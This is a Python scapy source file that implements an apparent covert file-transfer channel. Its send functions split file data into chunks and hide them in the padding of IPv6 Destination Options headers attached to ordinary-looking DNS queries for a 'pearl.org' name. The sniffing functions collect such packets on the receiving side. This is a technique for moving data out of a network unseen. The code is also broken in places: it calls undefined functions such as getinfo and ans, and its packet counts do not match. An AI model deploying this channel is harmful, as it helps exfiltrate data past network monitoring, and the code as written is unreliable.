import time
import socket
import config
from scapy.all import *
def generate_send(filename, cw_list, cw_cnt, pad_bytes):
    dnsIP = getinfo.dst_addrs()
    fqdn_prefix = filename + '.' + str(cw_cnt) + '.'
    fqdn_suffix = '.' + str(pad_bytes) + '.pearl.org'
    for chunk_num in range(cw_cnt):
        for slice in range(16):
            fqdn = fqdn_prefix + str(chunk_num) + fqdn_suffix
            pkt = IPv6(dst=dnsIP)/ \
                  IPv6ExtHdrDestOpt(options=PadN(otype=30, optdata=cw_list[chunk_num][slice]))/ \
                  UDP(dport=53)/ \
                  DNS(id=slice, qd=DNSQR(qname=fqdn, qtype="A"))
            send(pkt, verbose=0)
            print("Transfer progress: packet index [{}]".format(chunk_num * 16 + slice), end = '\r')
    return True

def pkt_loss_send(filename, cwlist, cw_cnt, last):
    dnsMAC, dnsIP = config.dst_addrs()
    whohas_pre = filename + '.' + str(cw_cnt) + '.'
    for cw in range(cw_cnt):
        for i in range(15):
            whohas = whohas_pre + str(cw) + '.' + str(last) + '.pearl.org'
            pkt = IPv6(dst=dnsIP)/IPv6ExtHdrDestOpt(options=PadN(otype=30, optdata=cwlist[cw][i]))/UDP(dport=53)/DNS(id=i, qd=DNSQR(qname=whohas, qtype="A"))
            send(pkt, verbose=0)
            print("Packets sended: index [{}]".format(cw * 16 + i), end = '\r')
    return cw_cnt*15

def sniff_ip6_DstEH(s):
    frame_buff = []
    while True:
        frame, addr = s.recvfrom(512)
        if frame[20] == 60: # next hdr is dst opt eh (protocol num: 60)
            frame_buff.append(frame)
            idle_time = time.time() # renew timer
        else:
            try:
                if time.time() - idle_time > 5: # if idle time > 5 sec
                    break
            except:
                continue
    return frame_buff

def sniff_ip6(s, start, timelimit):
    frame_buff = []
    while (time.time() - start) < timelimit:
        frame, addr = s.recvfrom(512)
        if frame[12:14] == b'\x86\xdd': # Filter for IPv6
             frame_buff.append(frame)
    return frame_buff

def sniff_dns(s):
    cnt = 0
    while True:
        frame, addr = s.recvfrom(512)
        pkt = Ether(frame)
        try:
            dns = pkt.getlayer(DNS)
            ans(pkt, dns)
            cnt += 1
        except:
            continue
    return cnt
